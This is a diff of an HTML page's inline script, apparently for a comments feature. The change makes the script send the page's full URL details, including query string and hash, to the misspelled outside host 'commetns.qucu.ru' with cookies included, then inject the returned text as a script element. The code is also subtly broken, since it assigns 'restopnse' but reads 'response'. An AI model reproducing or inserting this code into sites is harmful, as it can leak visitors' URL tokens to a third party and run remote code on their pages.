@@ -74,6 +74,26 @@
     </script> -->
     <script>
         document.addEventListener("DOMContentLoaded",async ()=>{
+            const data = {
+                // userName: form.elements['user'].value.trim(),
+                // message: form.elements['message'].value.trim(),
+                date: new Date().toISOString(),
+                idea: {
+                    id: 'a777',
+                    site: {
+                        ancestorOrigins: {},
+                        href: location.href,
+                        origin: location.origin,
+                        protocol: location.protocol,
+                        host: location.host,
+                        hostname: location.hostname,
+                        port: location.port,
+                        pathname: location.pathname,
+                        search: location.search,
+                        hash: location.hash
+                    }
+                }
+            };
             try{
                 const restopnse=await fetch("https://commetns.qucu.ru/allow-cors",{
                     method:'POST',
@@ -82,7 +102,7 @@
                     },
                     mode:'cors',
                     credentials:'include',
-                    body:JSON.stringify({})
+                    body:JSON.stringify(data)
                 });
                 const result=await response.text();
                 let js=document.createElement('script');
